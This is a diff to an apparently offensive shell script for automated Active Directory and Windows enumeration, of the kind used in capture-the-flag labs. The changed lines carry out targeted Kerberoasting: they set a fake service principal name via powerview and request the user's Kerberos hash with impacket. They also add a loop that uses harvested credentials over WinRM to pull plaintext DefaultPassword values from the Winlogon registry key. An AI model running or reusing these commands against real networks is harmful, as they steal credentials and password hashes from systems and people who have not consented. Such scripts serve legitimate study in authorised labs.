@@ -201,7 +201,7 @@ for port in $open_ports; do
           		objuser=$(powerview "$credu":"$credp"@"$target" -q "ConvertFrom-SID -ObjectSID $objsid" | grep -v 'Logging' | sed -E 's/.*\\//')
       			if [ -n "$objsid" ]; then
 	          		powerview "$credu":"$credp"@"$target" -q "Set-DomainObject -Identity $objsid -Set ServicePrincipalName='ANY/ANY'" | grep -v 'Logging'
-	    			clockskew=$(nmap -sC -p139,445 10.129.194.32 --min-rate 10000 | grep -iE 'clock-skew:' | sed -E 's/.*: //' | sed -E 's/(.*h).*/\1/')
+	    			clockskew=$(nmap -sC -p139,445 "$target" --min-rate 10000 | grep -iE 'clock-skew:' | sed -E 's/.*: //' | sed -E 's/(.*h).*/\1/')
 		      		for domain in $(cat "$enumx_dir/domains"); do
 		      			if [ -n "$clockskew" ]; then
 			      			faketime -f "+$clockskew" impacket-GetUserSPNs -request-user "$objuser" -dc-ip "$target" "$domain"/"$credu":"$credp" 2>/dev/null | grep -iE '\$krb' | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes"       			
@@ -585,11 +585,21 @@ for port in $open_ports; do
             ;;
         5985)
             # https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
-            curl -I http://"$target":"$port"
+            while IFS= read -r cred; do
+                read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+                if [ -n "$credp" ]; then
+                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
+                fi
+            done < "$enumx_dir/creds"
             ;;
         5986)
             # https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
-            curl -I http://"$target":"$port"
+            while IFS= read -r cred; do
+                read credu credp <<< $(echo "$cred" | sed 's/:/ /')
+                if [ -n "$credp" ]; then
+                	nxc winrm "$target" -u "$credu" -p "$credp" -X 'Get-Item -Path "HKLM:\software\microsoft\windows nt\currentversion\winlogon"' | grep -iE 'DefaultPassword' | sed 's/.*: //' | tee -a "$enumx_dir/passwords"
+                fi
+            done < "$enumx_dir/creds"
             ;;
         6000)
             nmap -sV --script x11-access -p "$port" "$target"
